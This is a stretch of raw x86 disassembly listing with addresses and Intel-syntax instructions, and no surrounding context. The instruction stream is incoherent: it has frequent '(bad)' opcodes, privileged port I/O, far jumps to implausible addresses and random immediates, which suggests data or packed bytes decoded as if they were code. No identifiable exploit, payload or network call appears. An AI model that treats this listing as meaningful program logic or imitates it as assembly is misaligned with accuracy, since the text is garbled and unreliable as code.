  41a743:	xchg   edx,eax
  41a744:	rcl    DWORD PTR [ebx],1
  41a746:	mov    esi,0xe741a8e5
  41a74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a74c:	xchg   esp,eax
  41a74d:	mov    cl,0xfb
  41a74f:	pop    ebx
  41a750:	test   DWORD PTR [eax],ebx
  41a752:	add    al,0xeb
  41a754:	mov    bl,0x1f
  41a756:	and    DWORD PTR [ecx+0x41],ecx
  41a759:	in     al,dx
  41a75a:	push   ebp
  41a75b:	inc    edx
  41a75c:	ins    BYTE PTR es:[edi],dx
  41a75d:	or     eax,0x41a164f3
  41a762:	sub    ch,BYTE PTR [ebx-0x30]
  41a765:	add    al,0x3b
  41a767:	retf   
  41a768:	mov    eax,0x744fa5e8
  41a76d:	aas    
  41a76e:	or     al,0xc5
  41a770:	ss popa 
  41a772:	sbb    DWORD PTR [edx+ebp*1],eax
  41a775:	ins    DWORD PTR es:[edi],dx
  41a776:	mov    ds:0xff898563,al
  41a77b:	jmp    0xbe593981
  41a780:	popa   
  41a781:	sbb    BYTE PTR [edi+eax*1+0x76],0xba
  41a786:	jbe    0x41a7ff
  41a788:	cmp    ebp,DWORD PTR [edi+ebx*4]
  41a78b:	adc    al,0x59
  41a78d:	in     al,dx
  41a78e:	mov    cl,0x66
  41a790:	cmc    
  41a791:	pop    edx
  41a792:	sub    BYTE PTR [esi+esi*2+0x45],al
  41a796:	cld    
  41a797:	cmc    
  41a798:	cmp    eax,0x7dae3b47
  41a79d:	xchg   edx,eax
  41a79e:	lods   eax,DWORD PTR ds:[esi]
  41a79f:	dec    edx
  41a7a0:	fs inc esp
  41a7a2:	icebp  
  41a7a3:	retf   0xd0ab
  41a7a6:	out    dx,eax
  41a7a7:	mov    edx,0xc5f65d30
  41a7ac:	and    eax,0x951d3e54
  41a7b1:	mov    ecx,0x25a82d84
  41a7b6:	jecxz  0x41a821
  41a7b8:	aaa    
  41a7b9:	push   esi
  41a7ba:	fs aad 0x72
  41a7bd:	mov    al,ds:0x2ca43ef
  41a7c2:	add    eax,0xa5c478ae
  41a7c7:	fs xchg edi,eax
  41a7c9:	jle    0x41a79f
  41a7cb:	out    0xc8,al
  41a7cd:	sbb    edx,eax
  41a7cf:	dec    ebx
  41a7d0:	dec    edx
  41a7d1:	xor    dh,0x51
  41a7d4:	and    eax,0xbf1770a1
  41a7d9:	xchg   ebp,eax
  41a7da:	sahf   
  41a7db:	sub    BYTE PTR [ebp-0x56],bh
  41a7de:	and    esi,DWORD PTR [eax]
  41a7e0:	jmp    0x72e2:0x3c76490a
  41a7e7:	fs xor eax,0x8834eed9
  41a7ed:	jne    0x41a821
  41a7ef:	neg    ch
  41a7f1:	add    eax,0x706cbbe5
  41a7f6:	jbe    0x41a834
  41a7f8:	jno    0x41a80b
  41a7fa:	imul   edi,ebp,0x4b
  41a7fd:	adc    DWORD PTR [edx+0x6c],0x2d14ebc4
  41a804:	and    ebp,esp
  41a806:	sub    BYTE PTR [esi],0xd1
  41a809:	xor    eax,0xb0f61326
  41a80e:	pop    ebp
  41a80f:	xchg   ebp,eax
  41a810:	jg     0x41a7bc
  41a812:	mov    bh,0xeb
  41a814:	mov    esi,0x6b8e5d65
  41a819:	mov    fs,edx
  41a81b:	sub    eax,0x9f7bba82
  41a820:	jae    0x41a882
  41a822:	push   edx
  41a823:	push   ecx
  41a824:	and    dl,BYTE PTR [ebx-0x624989be]
  41a82a:	int    0x87
  41a82c:	stos   BYTE PTR es:[edi],al
  41a82d:	or     dh,dl
  41a82f:	mov    DWORD PTR [edi+0x39],eax
  41a832:	dec    edi
  41a833:	iret   
  41a834:	xchg   ecx,eax
  41a835:	jnp    0x41a838
  41a837:	test   bl,dl
  41a839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a83a:	dec    BYTE PTR [eax+0x5666139]
  41a840:	daa    
  41a841:	fs cdq 
  41a843:	aas    
  41a844:	jl     0x41a8bb
  41a846:	call   0x13682154
  41a84b:	ins    DWORD PTR es:[edi],dx
  41a84c:	mov    ds:0x8bd74cd7,eax
  41a851:	sar    DWORD PTR [edi-0x12],1
  41a854:	jle    0x41a824
  41a856:	ret    0xdddb
  41a859:	add    DWORD PTR [ebx-0x503f5c16],esi
  41a85f:	jle    0x41a801
  41a861:	mov    gs,WORD PTR ds:0xb45633d3
  41a867:	xchg   edi,eax
  41a868:	mov    edx,0xcc023461
  41a86d:	ror    DWORD PTR [ebx+0x4dc9c6fa],1
  41a873:	fst    QWORD PTR [edx-0x457099ca]
  41a879:	(bad)  
  41a87b:	cmp    BYTE PTR [edi+0x2c],0x24
  41a87f:	xchg   BYTE PTR [esi-0x7d],dl
  41a882:	jge    0x41a8f7
  41a884:	mov    eax,ds:0x9c8ac18c
  41a889:	retf   
  41a88a:	js     0x41a81e
  41a88c:	das    
  41a88d:	sbb    al,0xeb
  41a88f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a890:	sbb    eax,0x10d766d
  41a895:	pop    esi
  41a896:	or     DWORD PTR [eax+edi*2],edx
  41a899:	sbb    DWORD PTR [edx-0x3d63f7f],0x4b
  41a8a0:	mov    cl,0x7f
  41a8a2:	es aad 0x1
  41a8a5:	popf   
  41a8a6:	es not bl
  41a8a9:	jne    0x41a908
  41a8ab:	(bad)  
  41a8ad:	bound  esi,QWORD PTR [ebp+0x4894fa2]
  41a8b3:	adc    BYTE PTR [edi],0x1f
  41a8b6:	icebp  
  41a8b7:	pop    esp
  41a8b8:	add    cl,ah
  41a8ba:	push   ebp
  41a8bb:	xor    BYTE PTR [eax-0x7e8485da],ch
  41a8c1:	std    
  41a8c2:	mov    bl,0x6d
  41a8c4:	mov    eax,0xd1cba124
  41a8c9:	cmp    al,0xa1
  41a8cb:	pop    ebx
  41a8cc:	std    
  41a8cd:	add    bh,BYTE PTR [ebx]
  41a8cf:	mov    bl,0xc6
  41a8d1:	push   edx
  41a8d2:	test   dh,ah
  41a8d4:	arpl   WORD PTR [edi+edx*1],sp
  41a8d7:	push   cs
  41a8d8:	jno    0x41a908
  41a8da:	jnp    0x41a86a
  41a8dc:	stos   DWORD PTR es:[edi],eax
  41a8dd:	sbb    al,BYTE PTR [esi+0x22433480]
  41a8e3:	enter  0xb14c,0x5a
  41a8e7:	repz mov ds:0x6a94b2ca,al
  41a8ed:	test   BYTE PTR [edi],ch
  41a8ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8f0:	fist   WORD PTR [edx+0x539ab76b]
  41a8f6:	cmp    DWORD PTR [edi+0x520ed31c],eax
  41a8fc:	(bad)  
  41a8fe:	xor    eax,DWORD PTR [esp+edi*2]
  41a901:	pop    ebp
  41a902:	ja     0x41a97a
  41a904:	test   eax,0x7b291bfc
  41a909:	nop
  41a90a:	adc    DWORD PTR [ebp-0x190ff9dc],eax
  41a910:	scas   al,BYTE PTR es:[edi]
  41a911:	mov    edx,0xc65f3f52
  41a916:	pushf  
  41a917:	lods   al,BYTE PTR ds:[esi]
  41a918:	pop    ss
  41a919:	push   es
  41a91a:	sub    al,BYTE PTR [eax-0x58af4d0d]
  41a920:	sub    DWORD PTR [ebx-0x60],esp
  41a923:	mov    esi,0x70ff6595
  41a928:	lock ret 0xb7a9
  41a92c:	mul    DWORD PTR [edx+edi*8+0x2ce006c7]
  41a933:	loop   0x41a923
  41a935:	popa   
  41a936:	(bad)  
  41a938:	jo     0x41a8c3
  41a93a:	mov    cl,ah
  41a93c:	push   esp
  41a93d:	out    dx,eax
  41a93e:	sub    BYTE PTR [edx+0xe7da767],dl
  41a944:	push   ecx
  41a945:	inc    ebx
  41a946:	ret    0x7b39
  41a949:	fdivr  DWORD PTR [edx]
  41a94b:	xchg   ebp,eax
  41a94c:	xchg   esi,eax
  41a94d:	loope  0x41a921
  41a94f:	mov    ds,WORD PTR [ebx+0x55cc98bc]
  41a955:	or     DWORD PTR [ebx-0xa9b2fd8],ebx
  41a95b:	lahf   
  41a95c:	sub    eax,0x969a233a
  41a961:	or     al,bh
  41a963:	dec    ebp
  41a964:	inc    ecx
  41a965:	xchg   esp,eax
  41a966:	shl    cl,0x57
  41a969:	sub    edx,ebp
  41a96b:	add    al,0xc4
  41a96d:	mov    esp,0xffaa4f72
  41a972:	(bad)  
  41a973:	pusha  
  41a974:	stos   BYTE PTR es:[edi],al
  41a975:	mov    ebx,0x93f115d4
  41a97a:	imul   BYTE PTR [ebx]
  41a97c:	in     eax,dx
  41a97d:	clc    
  41a97e:	sbb    eax,0xb6ad872d
  41a983:	and    eax,0xffa56a8a
  41a988:	add    esi,DWORD PTR [edx-0x66f6f108]
  41a98e:	jnp    0x41a949
  41a990:	push   0xc851dab0
  41a995:	pop    ss
  41a996:	xor    DWORD PTR [edx+ebp*1-0x75af5656],ecx
  41a99d:	xchg   ebx,eax
  41a99e:	outs   dx,BYTE PTR ds:[esi]
  41a99f:	and    BYTE PTR [eax+0x40],cl
  41a9a2:	rcr    DWORD PTR [ebp-0x267798c1],1
  41a9a8:	in     eax,dx
  41a9a9:	inc    eax
  41a9aa:	mov    WORD PTR [eax-0x9],?
  41a9ad:	push   ss
  41a9ae:	mov    ebx,0xc6621833
  41a9b3:	je     0x41aa2a
  41a9b5:	dec    edi
  41a9b6:	lahf   
  41a9b7:	clc    
  41a9b8:	inc    edi
  41a9b9:	jae    0x41a9de
  41a9bb:	mul    esp
  41a9bd:	jns    0x41a940
  41a9bf:	push   eax
  41a9c0:	fbstp  TBYTE PTR [esi]
  41a9c2:	fcmovne st,st(1)
  41a9c4:	push   0x7d
  41a9c6:	outs   dx,BYTE PTR ds:[esi]
  41a9c7:	lods   al,BYTE PTR ds:[esi]
  41a9c8:	lods   al,BYTE PTR ds:[esi]
  41a9c9:	ficomp DWORD PTR [edx-0x2e]
  41a9cc:	out    0x5f,al
  41a9ce:	std    
  41a9cf:	ficom  DWORD PTR [esi]
  41a9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9d2:	(bad)  
  41a9d4:	mov    eax,ds:0x2d15df9d
  41a9d9:	daa    
  41a9da:	adc    al,0xcc
  41a9dc:	lahf   
  41a9dd:	adc    al,0xc0
  41a9df:	jmp    0x68cf2249
  41a9e4:	sub    ebp,DWORD PTR fs:[ecx+0xa]
  41a9e8:	sbb    esi,ecx
  41a9ea:	sub    al,0x23
  41a9ec:	add    edi,DWORD PTR [edx+eax*2+0x2a552de7]
  41a9f3:	mov    al,0x76
  41a9f5:	xchg   edx,eax
  41a9f6:	jb     0x41aa27
  41a9f8:	mov    ds:0x1175201b,eax
  41a9fd:	push   ds
  41a9fe:	or     DWORD PTR [ecx+0x54b32ae2],edi
  41aa04:	jne    0x41a991
  41aa06:	add    al,0xff
  41aa08:	ss ss push esp
  41aa0b:	xchg   esi,eax
  41aa0c:	xor    dl,al
  41aa0e:	(bad)  
  41aa0f:	aad    0xba
  41aa11:	mov    edi,0x9e9722a6
  41aa16:	cmp    bl,ch
  41aa18:	ret    
  41aa19:	push   0xf2322d4c
  41aa1e:	lods   al,BYTE PTR ds:[esi]
  41aa1f:	jecxz  0x41a9d0
  41aa21:	fs mov esp,cs
  41aa24:	cmp    eax,0x180e02
  41aa29:	nop
  41aa2a:	sti    
  41aa2b:	nop
  41aa2c:	lahf   
  41aa2d:	gs loope 0x41aaa9
  41aa30:	sbb    DWORD PTR [ebx-0x5a80954f],ecx
  41aa36:	fistp  QWORD PTR [eax]
  41aa38:	dec    ebp
  41aa39:	(bad)  
  41aa3a:	mov    dl,0x95
  41aa3c:	leave  
  41aa3d:	inc    ecx
  41aa3e:	aam    0x2b
  41aa40:	data16 in al,dx
  41aa42:	add    al,0x7d
  41aa44:	js     0x41aa08
  41aa46:	ins    DWORD PTR es:[edi],dx
  41aa47:	ret    
  41aa48:	mov    ebx,0xb3529cb2
  41aa4d:	xor    DWORD PTR [eax-0x2336c4e4],eax
  41aa53:	sub    al,0x5f
  41aa55:	out    dx,al
  41aa56:	cmp    al,0x26
  41aa58:	add    ebp,DWORD PTR [edi+edi*1-0x4e35c6dc]
  41aa5f:	mov    ch,bh
  41aa61:	retf   
  41aa62:	loopne 0x41aae2
  41aa64:	gs aas 
  41aa66:	test   eax,0xbba32e9f
  41aa6b:	ja     0x41a9fc
  41aa6d:	into   
  41aa6e:	lea    edx,[esi+0xb77be85]
  41aa74:	jno    0x41aabe
  41aa76:	out    dx,al
  41aa77:	shr    dl,1
  41aa79:	in     eax,dx
  41aa7a:	mov    bl,0xef
  41aa7c:	loope  0x41aaed
  41aa7e:	jmp    DWORD PTR [ebp+0x57]
  41aa81:	out    0xf8,eax
  41aa83:	mov    dh,0xa2
  41aa85:	mov    edx,0xd093ebec
  41aa8a:	jmp    0x41aa5f
  41aa8c:	ins    BYTE PTR es:[edi],dx
  41aa8d:	int3   
  41aa8e:	jb     0x41aad8
  41aa90:	out    dx,al
  41aa91:	mov    dl,0xe2
  41aa93:	mov    eax,fs:0x55c954a4
  41aa99:	jecxz  0x41aa97
  41aa9b:	aas    
  41aa9c:	call   0xa90e3f05
  41aaa1:	cwde   
  41aaa2:	neg    esp
  41aaa4:	xor    al,0x52
  41aaa6:	sbb    edx,DWORD PTR [edi]
  41aaa8:	retf   
  41aaa9:	nop
  41aaaa:	call   0x76e8fb00
  41aaaf:	je     0x41aaeb
  41aab1:	mov    WORD PTR [edi+eax*8-0x40],cs
  41aab5:	aam    0x92
  41aab7:	je     0x41aa85
  41aab9:	enter  0x67f8,0x40
  41aabd:	adc    ebp,ecx
  41aabf:	jle    0x41aadb
  41aac1:	xor    al,0x41
  41aac3:	adc    ah,cl
  41aac5:	xchg   ebx,eax
  41aac6:	xor    dh,BYTE PTR [esi-0x435d04bf]
  41aacc:	imul   ebp,DWORD PTR [edi+0x4a],0x73
  41aad0:	cmc    
  41aad1:	repz push ss
  41aad3:	(bad)  
  41aad4:	in     al,dx
  41aad5:	sub    BYTE PTR [eax],dl
  41aad7:	and    ch,dh
  41aad9:	fldenv [esi+edx*1]
  41aadc:	iret   
  41aadd:	call   0xd2f94f5b
  41aae2:	jbe    0x41ab04
  41aae4:	out    0xff,al
  41aae6:	and    BYTE PTR [ecx+0x70aad307],ch
  41aaec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaed:	jmp    0x41ab19
  41aaef:	fwait
  41aaf0:	mov    edx,0xe27f26ba
  41aaf5:	stos   BYTE PTR es:[edi],al
  41aaf6:	sub    al,0x4a
  41aaf8:	loop   0x41ab11
  41aafa:	mov    cl,0x14
  41aafc:	and    DWORD PTR [edi+0xc],esp
  41aaff:	cmp    eax,0xc96d8671
  41ab04:	and    DWORD PTR [edi-0x47384398],edi
  41ab0a:	jno    0x41ab70
  41ab0c:	ss cmp edx,ebp
  41ab0f:	jmp    0x12440419
  41ab14:	sbb    BYTE PTR [ebx+0x14],0x63
  41ab18:	daa    
  41ab19:	rcl    DWORD PTR [ebx+0x58],cl
  41ab1c:	adc    bh,BYTE PTR [edi]
  41ab1e:	dec    esp
  41ab1f:	dec    ebp
  41ab20:	pusha  
  41ab21:	adc    cl,bh
  41ab23:	popf   
  41ab24:	dec    BYTE PTR [edi-0x3207e64e]
  41ab2a:	push   ds
  41ab2b:	pop    ds
  41ab2c:	or     al,BYTE PTR [eax]
  41ab2e:	jne    0x41ab09
  41ab30:	aad    0xd1
  41ab32:	out    dx,al
  41ab33:	imul   ebp,DWORD PTR [eax-0x3b80ec4c],0x34
  41ab3a:	lods   eax,DWORD PTR ds:[esi]
  41ab3b:	(bad)  
  41ab3c:	clc    
  41ab3d:	add    eax,0xc593e906
  41ab42:	push   ebp
  41ab43:	int3   
  41ab44:	(bad)  [ecx-0x12a30b25]
  41ab4a:	pop    ss
  41ab4b:	sahf   
  41ab4c:	outs   dx,BYTE PTR ds:[esi]
  41ab4d:	scas   al,BYTE PTR es:[edi]
  41ab4e:	aad    0x15
  41ab50:	mov    ecx,0x3597502c
  41ab55:	adc    al,0x84
  41ab57:	scas   al,BYTE PTR es:[edi]
  41ab58:	in     eax,0x32
  41ab5a:	and    dh,ch
  41ab5c:	cmp    ah,0xfe
  41ab5f:	pop    eax
  41ab60:	ficom  WORD PTR [ecx+0x29]
  41ab63:	data16 ffreep st(0)
  41ab66:	pop    ecx
  41ab67:	in     al,0xe8
  41ab69:	fld    QWORD PTR [ecx]
  41ab6b:	and    ecx,0x1c1a7a4e
  41ab71:	sahf   
  41ab72:	ret    0xd2d4
  41ab75:	xor    BYTE PTR [edi],dl
  41ab77:	fs (bad) 
  41ab7a:	cld    
  41ab7b:	fdiv   QWORD PTR [esi]
  41ab7d:	jo     0x41ab78
  41ab7f:	mov    al,0x38
  41ab81:	fstp   st(2)
  41ab83:	jg     0x41ab8a
  41ab85:	mov    esp,DWORD PTR [eax-0x2f1d4e96]
  41ab8b:	push   ecx
  41ab8c:	ret    0x3613
  41ab8f:	sbb    al,0x93
  41ab91:	call   0xaf59b6
  41ab96:	mov    BYTE PTR [ebp+0x57],cl
  41ab99:	(bad)  
  41ab9a:	hlt    
  41ab9b:	cvttps2pi mm6,QWORD PTR ds:0x374cc0a2
  41aba2:	mov    ebx,DWORD PTR [edx-0x48a3e467]
  41aba8:	push   ds
  41aba9:	aad    0x9b
  41abab:	jae    0x41ac21
  41abad:	test   DWORD PTR [eax+0x3c],edx
  41abb0:	xchg   ecx,eax
  41abb1:	outs   dx,DWORD PTR ds:[esi]
  41abb2:	shr    DWORD PTR [edx-0x51],0xc2
  41abb6:	repnz push 0x296c9a1a
  41abbc:	xor    edi,edi
  41abbe:	lods   al,BYTE PTR ds:[esi]
  41abbf:	push   0x309142b
  41abc4:	mov    ah,0x7e
  41abc6:	xchg   ebp,eax
  41abc7:	xor    bl,BYTE PTR [eax]
  41abc9:	icebp  
  41abca:	ret    
  41abcb:	push   ebx
  41abcc:	add    BYTE PTR [ebx+0x6e],dl
  41abcf:	inc    edx
  41abd0:	cdq    
  41abd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd2:	inc    ebx
  41abd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abd4:	fdivrp st(7),st
  41abd6:	cld    
  41abd7:	pusha  
  41abd8:	and    al,0xe8
  41abda:	iret   
  41abdb:	loop   0x41ab82
  41abdd:	jle    0x41ab8d
  41abdf:	in     al,0xd9
  41abe1:	sbb    eax,0xecbf1f4d
  41abe6:	jp     0x41abb7
  41abe8:	xchg   esi,eax
  41abe9:	and    ah,al
  41abeb:	imul   ebx,edx,0xffffffbe
  41abee:	sub    BYTE PTR [edi+0x9b104af],0x4a
  41abf5:	mov    al,ds:0x4b27f012
  41abfb:	jbe    0x41ac28
  41abfd:	int3   
  41abfe:	(bad)  
  41abff:	loop   0x41abe7
  41ac01:	(bad)  
  41ac02:	addr16 push 0xf1210af6
  41ac08:	imul   edx,DWORD PTR [ebp+0x2d0bf348],0x9a3db428
  41ac12:	fild   QWORD PTR [eax+0x69]
  41ac15:	add    BYTE PTR [esi-0x6d],0x30
  41ac19:	push   ss
  41ac1a:	and    ch,BYTE PTR [ecx+0x6]
  41ac1d:	xchg   esi,eax
  41ac1e:	fmul   st,st(6)
  41ac20:	lock mov ebp,0x667ed796
  41ac26:	pop    eax
  41ac27:	arpl   WORD PTR [ecx-0x18520ca3],ax
  41ac2d:	or     al,0xe
  41ac2f:	iret   
  41ac30:	mov    esi,0x8924f44c
  41ac35:	mov    edi,0xc030c4a6
  41ac3a:	sub    al,BYTE PTR [ebx-0x58]
  41ac3d:	lea    eax,[ebx+0x654ddbee]
  41ac43:	test   DWORD PTR [ebp+0x70],ebx
  41ac46:	xor    DWORD PTR [ecx+0x54f393ca],edx
  41ac4c:	push   esi
  41ac4d:	pop    edx
  41ac4e:	mov    ch,0x80
  41ac50:	xchg   ebp,eax
  41ac51:	call   FWORD PTR [ebp-0x72c37bdf]
  41ac57:	push   eax
  41ac58:	iret   
  41ac59:	sub    BYTE PTR es:[ebp-0x1afca761],0x42
  41ac61:	or     eax,0x241305e5
  41ac66:	jge    0x41ac84
  41ac68:	aaa    
  41ac69:	in     eax,0x4b
  41ac6b:	popa   
  41ac6c:	into   
  41ac6d:	mov    ebx,DWORD PTR [ebx+ebx*2+0x19]
  41ac71:	iret   
  41ac72:	aas    
  41ac73:	push   ebx
  41ac74:	in     eax,0xb0
  41ac76:	jl     0x41acd0
  41ac78:	rcr    ch,1
  41ac7a:	pop    ebx
  41ac7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac7c:	sub    BYTE PTR [ebx-0xd],bl
  41ac7f:	push   edx
  41ac80:	sahf   
  41ac81:	and    DWORD PTR [ebx+0x740c3011],ecx
  41ac87:	icebp  
  41ac88:	dec    ebp
  41ac89:	sti    
  41ac8a:	es (bad) 
  41ac8c:	pusha  
  41ac8d:	stos   DWORD PTR es:[edi],eax
  41ac8e:	clc    
  41ac8f:	mov    WORD PTR [ecx+0x34],?
  41ac92:	cli    
  41ac93:	cmp    BYTE PTR [edx],ah
  41ac95:	jge    0x41ac51
  41ac97:	pushf  
  41ac98:	stc    
  41ac99:	or     cl,dh
  41ac9b:	or     dh,BYTE PTR [ebx+ecx*1]
  41ac9e:	xchg   ecx,eax
  41ac9f:	push   0x9622c074
  41aca4:	out    0x50,eax
  41aca6:	(bad)  
  41aca7:	push   edx
  41aca8:	scas   al,BYTE PTR es:[edi]
  41aca9:	sub    al,0x6b
  41acab:	(bad)  
  41acac:	fwait
  41acad:	mov    ebx,?
  41acaf:	pop    ebp
  41acb0:	cmp    edx,edx
  41acb2:	shr    BYTE PTR [ecx],cl
  41acb4:	jo     0x41ac9e
  41acb6:	pop    ecx
  41acb7:	ins    BYTE PTR es:[edi],dx
  41acb8:	pop    edx
  41acb9:	(bad)  
  41acba:	jp     0x41acf0
  41acbc:	inc    eax
  41acbd:	mov    al,0x1b
  41acbf:	test   BYTE PTR [esi+0x29],bl
  41acc2:	dec    eax
  41acc3:	cmp    BYTE PTR [ecx+0xa],dh
  41acc6:	fcmove st,st(5)
  41acc8:	push   ebx
  41acc9:	ja     0x41acd6
  41accb:	in     eax,0x51
  41accd:	or     BYTE PTR [ebx+0x7d2e3dbb],0x7f
  41acd4:	jmp    0x34fe25e9
  41acd9:	call   ebp
  41acdb:	jb     0x41acee
  41acdd:	inc    esp
  41acde:	jnp    0x41ad33
  41ace0:	xor    DWORD PTR [ebx+0x3],esi
  41ace3:	jmp    0x41ac79
  41ace5:	sahf   
  41ace6:	(bad)  
  41ace8:	repnz mov ah,0x42
  41aceb:	xchg   DWORD PTR [edx],esp
  41aced:	cwde   
  41acee:	out    dx,al
  41acef:	jmp    0x9929:0xddfc4582
  41acf6:	fs mov al,0xbc
  41acf9:	mov    al,0x1e
  41acfb:	xchg   dl,bh
  41acfd:	add    al,0x6b
  41acff:	mov    WORD PTR [eax],ds
  41ad01:	jne    0x41ad02
  41ad03:	mov    ecx,0x66d3c4f4
  41ad08:	retf   0x1eb4
  41ad0b:	jg     0x41aced
  41ad0d:	retf   0xf800
  41ad10:	out    dx,eax
  41ad11:	mov    edx,0xf03c0fe
  41ad16:	(bad)  
  41ad17:	jle    0x41acef
  41ad19:	inc    esp
  41ad1a:	mov    gs,WORD PTR [ebp-0x4c]
  41ad1d:	(bad)  
  41ad1f:	mov    bl,0xfd
  41ad21:	stos   BYTE PTR es:[edi],al
  41ad22:	mov    edi,0xd788ede1
  41ad27:	lahf   
  41ad28:	das    
  41ad29:	(bad)  
  41ad2a:	jle    0x41ad12
  41ad2c:	ins    BYTE PTR es:[edi],dx
  41ad2d:	push   edi
  41ad2e:	push   ds
  41ad2f:	or     DWORD PTR [ebx],0x79102bc7
  41ad35:	mov    eax,ds:0x3cb6963a
  41ad3a:	imul   eax,edi,0xffffffeb
  41ad3d:	xor    eax,0x81d337d5
  41ad42:	sbb    eax,0x1a571e76
  41ad47:	push   edx
  41ad48:	mov    ds:0x90ec1b45,al
  41ad4d:	xchg   edi,ebp
  41ad4f:	push   0xb4d714f
  41ad54:	aaa    
  41ad55:	sub    DWORD PTR [ebp+0x3a],esi
  41ad58:	lea    ebx,[ebp-0x42e53179]
  41ad5e:	rcl    DWORD PTR [esi+0x2],1
  41ad61:	repnz mov eax,0xa76881d8
  41ad67:	mov    bl,dl
  41ad69:	scas   eax,DWORD PTR es:[edi]
  41ad6a:	imul   esp,DWORD PTR [ebx+0x5267c37c],0x53
  41ad71:	push   esp
  41ad72:	sahf   
  41ad73:	inc    edi
  41ad74:	bound  edi,QWORD PTR [ebx-0x3d2afde0]
  41ad7a:	jge    0x41ad37
  41ad7c:	das    
  41ad7d:	or     al,0xb6
  41ad7f:	sbb    ch,BYTE PTR [ecx+0x2a]
  41ad82:	cmp    al,0xc9
  41ad84:	add    eax,0x9360e654
  41ad89:	(bad)  
  41ad8a:	gs cwde 
  41ad8c:	jl     0x41adb1
  41ad8e:	pop    ebx
  41ad8f:	fadd   QWORD PTR [edi]
  41ad91:	cmp    al,0xab
  41ad93:	cs enter 0x1f89,0xe8
  41ad98:	loopne 0x41ad1c
  41ad9a:	cmp    DWORD PTR [esi],eax
  41ad9c:	pop    es
  41ad9d:	repnz nop
  41ad9f:	mov    dh,0x73
  41ada1:	pop    es
  41ada2:	fsubr  QWORD PTR [eax+0x62e5cb71]
  41ada8:	add    ch,BYTE PTR [ebp+0x1d]
  41adab:	pop    ds
  41adac:	sbb    al,0x31
  41adae:	mov    BYTE PTR [esi+edx*2+0x72],bh
  41adb2:	xchg   esi,eax
  41adb3:	(bad)  
  41adb4:	pop    ebp
  41adb5:	jmp    0x8b7e:0x36e8e36e
  41adbc:	pop    esp
  41adbd:	cmp    DWORD PTR [edi+0x19],esp
  41adc0:	fdiv   st,st(2)
  41adc2:	cwde   
  41adc3:	adc    eax,0x57108a47
  41adc8:	sub    ah,ah
  41adca:	daa    
  41adcb:	add    DWORD PTR [ebp+0x41df7060],ebp
  41add1:	cmp    edi,DWORD PTR [edx+0x7b6c6624]
  41add7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41add8:	ss aad 0xd2
  41addb:	(bad)
  41addf:	mov    ebx,0x3c3b0896
  41ade4:	dec    ecx
  41ade5:	push   es
  41ade6:	add    DWORD PTR [eax-0x9],edx
  41ade9:	xlat   BYTE PTR ds:[ebx]
  41adea:	mov    cl,0x8b
  41adec:	(bad)  
  41aded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adee:	dec    ebx
  41adef:	scas   eax,DWORD PTR es:[edi]
  41adf0:	jnp    0x41ad92
  41adf2:	add    eax,0xd6a05c71
  41adf7:	cwde   
  41adf8:	mov    eax,ds:0xb268072b
  41adfd:	xchg   BYTE PTR [edi+0x45],dh
  41ae00:	pop    esi
  41ae01:	into   
  41ae02:	fnsave [esi+0x3b]
  41ae05:	pop    ds
  41ae06:	inc    edi
  41ae07:	mov    ds:0xedbff726,al
  41ae0c:	jne    0x41ae3a
  41ae0e:	adc    bl,BYTE PTR [eax+0x2aa5a09c]
  41ae14:	xchg   BYTE PTR ss:[esi+0x6f67c2c3],bh
  41ae1b:	dec    ecx
  41ae1c:	and    DWORD PTR [eax*1-0x4c712537],esp
  41ae23:	jbe    0x41ae88
  41ae25:	nop
  41ae26:	jae    0x41adcf
  41ae28:	xchg   esp,eax
  41ae29:	popa   
  41ae2a:	lahf   
  41ae2b:	call   0xd10f0be9
  41ae30:	jg     0x41ae19
  41ae32:	iret   
  41ae33:	mov    bl,0x62
  41ae35:	jnp    0x41ae93
  41ae37:	shl    edi,cl
  41ae39:	mov    eax,0xa247ab71
  41ae3e:	fwait
  41ae3f:	jne    0x41ae82
  41ae41:	es push ecx
  41ae43:	loope  0x41ae84
  41ae45:	clc    
  41ae46:	jbe    0x41ade9
  41ae48:	je     0x41aec9
  41ae4a:	adc    eax,0x29cfcbf7
  41ae4f:	shl    BYTE PTR [ecx+0x6f],1
  41ae52:	inc    ebp
  41ae53:	not    DWORD PTR [ecx+edi*8]
  41ae56:	call   0x7bc1:0x32c5a385
  41ae5d:	mov    al,0xf0
  41ae5f:	pop    es
  41ae60:	gs inc esp
  41ae62:	adc    al,0x17
  41ae64:	add    DWORD PTR [eax],esi
  41ae66:	mov    al,0x54
  41ae68:	cmp    eax,0xeb135337
  41ae6d:	sub    BYTE PTR [ebx],dl
  41ae6f:	sbb    eax,0x93d97562
  41ae74:	inc    ax
  41ae76:	xor    eax,0x4fadb5e1
  41ae7b:	jmp    FWORD PTR ds:0xbeff628
  41ae81:	xor    edx,ebp
  41ae83:	cmc    
  41ae84:	sbb    bl,dh
  41ae86:	adc    ebx,DWORD PTR [edx+0x74d1707a]
  41ae8c:	aad    0xd0
  41ae8e:	sbb    eax,0x739207ae
  41ae93:	cmp    DWORD PTR [ebx+0x32],edx
  41ae96:	pop    ebx
  41ae97:	push   esp
  41ae98:	retf   
  41ae99:	retf   0x1637
  41ae9c:	call   0x827ff8e8
  41aea1:	jae    0x41ae47
  41aea3:	push   edi
  41aea4:	or     al,0xfc
  41aea6:	add    DWORD PTR [edi+eiz*8+0x59],0x61
  41aeab:	xor    eax,0x78781b6b
  41aeb0:	and    bh,BYTE PTR cs:[ebp+eax*4+0x7f]
  41aeb5:	sbb    edi,DWORD PTR [eax-0x24000811]
  41aebb:	push   edx
  41aebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aebd:	push   esp
  41aebe:	and    eax,0xd800c1de
  41aec3:	in     al,0xd7
  41aec5:	xor    ebp,DWORD PTR [edi-0x593d29f2]
  41aecb:	outs   dx,BYTE PTR ds:[esi]
  41aecc:	loopne 0x41aeae
  41aece:	cmp    al,0xbe
